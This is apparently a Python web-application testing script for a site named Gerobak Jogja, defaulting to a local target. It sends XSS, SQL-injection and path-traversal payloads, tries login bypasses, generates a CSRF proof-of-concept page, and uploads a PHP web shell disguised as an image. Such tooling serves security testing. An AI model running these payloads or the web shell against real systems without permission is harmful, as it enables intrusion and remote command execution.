#!/usr/bin/env python3
"""
Manual Testing Helper Script for Gerobak Jogja
This script helps with manual testing tasks and payload generation
"""

import requests
import json
import time
import random
import string
from urllib.parse import urljoin, urlparse
import argparse

class ManualTester:
    def __init__(self, target_url, proxy=None):
        self.target_url = target_url
        self.session = requests.Session()
        
        # Configure proxy if provided (for Burp Suite)
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
            # Disable SSL verification when using proxy
            self.session.verify = False
            
    def test_xss_reflection(self, endpoint, parameter, payloads):
        """Test XSS reflection on specific endpoint"""
        print(f"[+] Testing XSS on {endpoint} parameter: {parameter}")
        
        vulnerable = []
        for payload in payloads:
            try:
                # Test GET parameter
                params = {parameter: payload}
                response = self.session.get(urljoin(self.target_url, endpoint), params=params)
                
                if payload in response.text:
                    print(f"[!] Potential XSS found: {payload}")
                    vulnerable.append({
                        'endpoint': endpoint,
                        'parameter': parameter,
                        'payload': payload,
                        'method': 'GET'
                    })
                
                # Test POST parameter
                data = {parameter: payload}
                response = self.session.post(urljoin(self.target_url, endpoint), data=data)
                
                if payload in response.text:
                    print(f"[!] Potential XSS found (POST): {payload}")
                    vulnerable.append({
                        'endpoint': endpoint,
                        'parameter': parameter,
                        'payload': payload,
                        'method': 'POST'
                    })
                    
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                print(f"[-] Error testing payload {payload}: {e}")
        
        return vulnerable
    
    def test_sql_injection(self, endpoint, parameter, payloads):
        """Test SQL injection on specific endpoint"""
        print(f"[+] Testing SQL injection on {endpoint} parameter: {parameter}")
        
        vulnerable = []
        baseline_response = None
        
        try:
            # Get baseline response
            baseline_response = self.session.get(urljoin(self.target_url, endpoint))
            baseline_length = len(baseline_response.text)
            baseline_time = baseline_response.elapsed.total_seconds()
            
        except Exception as e:
            print(f"[-] Error getting baseline response: {e}")
            return vulnerable
        
        for payload in payloads:
            try:
                start_time = time.time()
                
                # Test GET parameter
                params = {parameter: payload}
                response = self.session.get(urljoin(self.target_url, endpoint), params=params)
                
                response_time = time.time() - start_time
                response_length = len(response.text)
                
                # Check for SQL errors
                sql_errors = [
                    'mysql_fetch_array',
                    'ORA-01756',
                    'Microsoft OLE DB Provider',
                    'SQLServer JDBC Driver',
                    'PostgreSQL query failed',
                    'Warning: mysql_',
                    'MySQLSyntaxErrorException',
                    'valid MySQL result',
                    'check the manual that corresponds to your MySQL server version'
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        print(f"[!] SQL error detected: {error}")
                        vulnerable.append({
                            'endpoint': endpoint,
                            'parameter': parameter,
                            'payload': payload,
                            'error': error,
                            'method': 'GET'
                        })
                
                # Check for time-based injection (if response takes significantly longer)
                if response_time > baseline_time + 3:
                    print(f"[!] Potential time-based SQL injection: {payload}")
                    vulnerable.append({
                        'endpoint': endpoint,
                        'parameter': parameter,
                        'payload': payload,
                        'type': 'time-based',
                        'method': 'GET'
                    })
                
                # Check for boolean-based injection (significant length difference)
                if abs(response_length - baseline_length) > 100:
                    print(f"[!] Potential boolean-based SQL injection: {payload}")
                    vulnerable.append({
                        'endpoint': endpoint,
                        'parameter': parameter,
                        'payload': payload,
                        'type': 'boolean-based',
                        'method': 'GET'
                    })
                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                print(f"[-] Error testing SQL payload {payload}: {e}")
        
        return vulnerable
    
    def test_file_upload(self, endpoint, file_payloads):
        """Test file upload vulnerabilities"""
        print(f"[+] Testing file upload on {endpoint}")
        
        vulnerable = []
        
        for file_info in file_payloads:
            try:
                filename = file_info['filename']
                content = file_info['content']
                content_type = file_info.get('content_type', 'application/octet-stream')
                
                files = {
                    'file': (filename, content, content_type)
                }
                
                response = self.session.post(urljoin(self.target_url, endpoint), files=files)
                
                # Check if upload was successful
                if response.status_code == 200 and 'success' in response.text.lower():
                    print(f"[!] File upload successful: {filename}")
                    vulnerable.append({
                        'endpoint': endpoint,
                        'filename': filename,
                        'content_type': content_type,
                        'status': 'uploaded'
                    })
                
                time.sleep(1)  # Rate limiting for file uploads
                
            except Exception as e:
                print(f"[-] Error testing file upload {file_info['filename']}: {e}")
        
        return vulnerable
    
    def test_authentication_bypass(self, login_endpoint):
        """Test authentication bypass techniques"""
        print(f"[+] Testing authentication bypass on {login_endpoint}")
        
        bypass_payloads = [
            {'email': 'admin', 'password': 'admin'},
            {'email': 'admin@admin.com', 'password': 'admin'},
            {'email': 'administrator', 'password': 'administrator'},
            {'email': 'admin\' OR \'1\'=\'1', 'password': 'anything'},
            {'email': 'admin\' --', 'password': 'anything'},
            {'email': 'admin\' /*', 'password': 'anything'},
        ]
        
        vulnerable = []
        
        for payload in bypass_payloads:
            try:
                response = self.session.post(
                    urljoin(self.target_url, login_endpoint),
                    json=payload
                )
                
                # Check for successful login indicators
                success_indicators = ['dashboard', 'admin panel', 'welcome', 'logout']
                
                for indicator in success_indicators:
                    if indicator.lower() in response.text.lower():
                        print(f"[!] Potential authentication bypass: {payload}")
                        vulnerable.append({
                            'endpoint': login_endpoint,
                            'payload': payload,
                            'indicator': indicator
                        })
                        break
                
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                print(f"[-] Error testing auth bypass {payload}: {e}")
        
        return vulnerable
    
    def generate_csrf_poc(self, target_endpoint, method='POST', parameters=None):
        """Generate CSRF Proof of Concept"""
        if parameters is None:
            parameters = {}
        
        csrf_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {target_endpoint}</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Target: {target_endpoint}</p>
    
    <form action="{urljoin(self.target_url, target_endpoint)}" method="{method}" id="csrf-form">
"""
        
        for param, value in parameters.items():
            csrf_html += f'        <input type="hidden" name="{param}" value="{value}">\n'
        
        csrf_html += """        <input type="submit" value="Submit Request">
    </form>
    
    <script>
        // Auto-submit form (comment out for manual testing)
        // document.getElementById('csrf-form').submit();
    </script>
</body>
</html>"""
        
        return csrf_html
    
    def test_directory_traversal(self, endpoint, parameter):
        """Test directory traversal vulnerabilities"""
        print(f"[+] Testing directory traversal on {endpoint}")
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc//passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
        ]
        
        vulnerable = []
        
        for payload in traversal_payloads:
            try:
                params = {parameter: payload}
                response = self.session.get(urljoin(self.target_url, endpoint), params=params)
                
                # Check for file content indicators
                file_indicators = ['root:', 'daemon:', 'bin:', 'sys:', '[boot loader]', '[operating systems]']
                
                for indicator in file_indicators:
                    if indicator in response.text:
                        print(f"[!] Directory traversal found: {payload}")
                        vulnerable.append({
                            'endpoint': endpoint,
                            'parameter': parameter,
                            'payload': payload,
                            'indicator': indicator
                        })
                        break
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"[-] Error testing traversal payload {payload}: {e}")
        
        return vulnerable

def load_payloads_from_file(filename):
    """Load payloads from file"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return payloads
    except FileNotFoundError:
        print(f"[-] Payload file not found: {filename}")
        return []

def main():
    parser = argparse.ArgumentParser(description='Manual Testing Helper for Gerobak Jogja')
    parser.add_argument('--target', default='http://localhost:8888', help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--test-xss', action='store_true', help='Test XSS vulnerabilities')
    parser.add_argument('--test-sqli', action='store_true', help='Test SQL injection')
    parser.add_argument('--test-upload', action='store_true', help='Test file upload')
    parser.add_argument('--test-auth', action='store_true', help='Test authentication bypass')
    parser.add_argument('--generate-csrf', help='Generate CSRF PoC for endpoint')
    parser.add_argument('--output', default='manual_test_results.json', help='Output file')
    
    args = parser.parse_args()
    
    # Initialize tester
    tester = ManualTester(args.target, args.proxy)
    
    results = {
        'target': args.target,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'vulnerabilities': []
    }
    
    print(f"[+] Starting manual testing on: {args.target}")
    if args.proxy:
        print(f"[+] Using proxy: {args.proxy}")
    
    # XSS Testing
    if args.test_xss:
        xss_payloads = load_payloads_from_file('payloads/xss_payloads.txt')
        if xss_payloads:
            # Test common endpoints
            endpoints = [
                ('/kontak', 'name'),
                ('/kontak', 'email'),
                ('/kontak', 'message'),
                ('/search', 'q'),
                ('/admin', 'email')
            ]
            
            for endpoint, param in endpoints:
                xss_results = tester.test_xss_reflection(endpoint, param, xss_payloads[:10])  # Test first 10 payloads
                results['vulnerabilities'].extend(xss_results)
    
    # SQL Injection Testing
    if args.test_sqli:
        sqli_payloads = load_payloads_from_file('payloads/sqli_payloads.txt')
        if sqli_payloads:
            # Test login endpoint
            sqli_results = tester.test_sql_injection('/admin', 'email', sqli_payloads[:15])  # Test first 15 payloads
            results['vulnerabilities'].extend(sqli_results)
    
    # File Upload Testing
    if args.test_upload:
        file_payloads = [
            {
                'filename': 'test.php',
                'content': '<?php echo "Hello World"; ?>',
                'content_type': 'application/x-php'
            },
            {
                'filename': 'test.php.jpg',
                'content': '<?php system($_GET["cmd"]); ?>',
                'content_type': 'image/jpeg'
            },
            {
                'filename': '../../../test.php',
                'content': '<?php phpinfo(); ?>',
                'content_type': 'text/plain'
            }
        ]
        
        upload_results = tester.test_file_upload('/admin/upload', file_payloads)
        results['vulnerabilities'].extend(upload_results)
    
    # Authentication Testing
    if args.test_auth:
        auth_results = tester.test_authentication_bypass('/admin')
        results['vulnerabilities'].extend(auth_results)
    
    # CSRF PoC Generation
    if args.generate_csrf:
        csrf_poc = tester.generate_csrf_poc(
            args.generate_csrf,
            'POST',
            {'action': 'delete', 'id': '123'}
        )
        
        csrf_filename = f"csrf_poc_{args.generate_csrf.replace('/', '_')}.html"
        with open(csrf_filename, 'w') as f:
            f.write(csrf_poc)
        print(f"[+] CSRF PoC generated: {csrf_filename}")
    
    # Save results
    with open(args.output, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"[+] Testing completed. Results saved to: {args.output}")
    print(f"[+] Found {len(results['vulnerabilities'])} potential vulnerabilities")

if __name__ == '__main__':
    main()